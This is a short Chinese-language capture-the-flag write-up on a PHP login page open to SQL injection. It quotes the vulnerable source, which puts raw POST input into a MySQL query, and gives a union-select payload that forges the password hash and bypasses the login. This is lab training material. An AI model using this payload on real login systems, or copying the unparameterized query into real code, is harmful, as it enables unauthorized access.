# SQL INJECTION 2

## 题目

> http://4.chinalover.sinaapp.com/web6/index.php
>
> ```php+HTML
> <html>
> <head>
> Secure Web Login II
> </head>
> <body>
> 
> <?php
> if($_POST[user] && $_POST[pass]) {
>    mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
>   mysql_select_db(SAE_MYSQL_DB);
>   $user = $_POST[user];
>   $pass = md5($_POST[pass]);
>   $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
>   if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
>       echo "<p>Logged in! Key: ntcf{**************} </p>";
>   }
>   else {
>     echo("<p>Log in failure!</p>");
>   }
> }
> ?>
> 
> 
> <form method=post action=index.php>
> <input type=text name=user value="Username">
> <input type=password name=pass value="Password">
> <input type=submit>
> </form>
> </body>
> <a href="index.phps">Source</a>
> </html>
> ```

## 解答思路

1. `strcasecmp`比较两个字符串是否相等，如果相等，则返回0，不相等则返回非0值；
2. php源码要求查询出的pw值和传入的pw值相等，所以，需要将原sql语句的返回值改为与传入的pw值相等，所以，需要将原结果清空，然后使用union select返回自己想要的值


## 解题步骤

1. 在hackbar中提交post数据：

   ```mssql
   user=admin' and 1=2 union select md5(1)%23&pass=1
   ```

   得到flag

## 漏洞挖掘思路

- todo

## 自动化解析

- TODO

- 判断题目特征：`web` `php` `md5 collision`
- 设定题目难度等级`level`为simple
- 提交相应符合要求的字符串

